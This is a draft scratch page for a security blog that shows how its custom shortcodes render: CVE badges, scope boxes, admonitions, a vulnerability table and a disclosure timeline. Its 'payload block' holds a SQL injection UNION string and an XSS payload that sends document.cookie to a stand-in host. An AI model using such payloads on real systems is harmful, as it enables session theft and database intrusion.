+++
title = "Reference Post: Every Shortcode at Once"
subtitle = "Delete this once you've seen it render"
date = 2026-08-23T12:00:00+06:00
draft = true
description = "A scratch page that exercises every custom shortcode, admonition, and code style on the site."
categories = ["cve"]
tags = ["meta", "reference"]
+++

This page exists to prove the styling works. Delete it before you publish
anything real.

## Badges

A CVE badge links straight to NVD: {{< cve "CVE-2024-3094" >}} — and you can
point it elsewhere with `link=`.

Severity pills colour themselves from the CVSS base score:
{{< severity 9.8 >}} {{< severity 7.5 >}} {{< severity 5.3 >}} {{< severity 2.1 >}}

## Scope box

{{< scope title="Target" >}}
- `*.example.com` — in scope
- `internal.example.com` — **out** of scope
- Rate limit: 20 req/s, no automated scanners
{{< /scope >}}

## Payload block

Verbatim, unhighlighted, nothing swallowed by the markdown parser:

{{< payload >}}
' UNION SELECT NULL,version(),current_user-- -
<img src=x onerror=fetch('//x.tld/'+document.cookie)>
{{< /payload >}}

## Code

```python
def decrypt(ct: bytes, key: bytes) -> bytes:
    """Nonce reuse means the keystream repeats — XOR two ciphertexts."""
    assert len(key) == 32, "bad key length"
    return bytes(a ^ b for a, b in zip(ct, key * (len(ct) // 32 + 1)))
```

```diff
- if (user.role = "admin") {
+ if (user.role === "admin") {
```

Inline `code` looks like this, and a shell prompt:

```bash
curl -sS 'https://example.com/api/v1/users/1337' -H 'Authorization: Bearer $TOKEN' | jq .
```

## Admonitions

{{< admonition tip "Rate limits" >}}
The single-packet attack sidesteps most naive rate limiting.
{{< /admonition >}}

{{< admonition danger "Don't" >}}
Never run this against a target you don't have written authorization for.
{{< /admonition >}}

## Table

| Endpoint | Method | Auth | Result |
| --- | --- | --- | --- |
| `/api/v1/users/:id` | GET | user | IDOR — reads any account |
| `/api/v1/admin/flags` | GET | user | BFLA — 200 OK |

> A quote, for the philosophy posts.

## Timeline

{{< timeline >}}
2026-01-04 | Reported via the program's HackerOne inbox
2026-01-06 | Triaged, severity set to **Critical**
2026-02-11 | Patch shipped in `3.2.1`
2026-03-01 | Public disclosure
{{< /timeline >}}
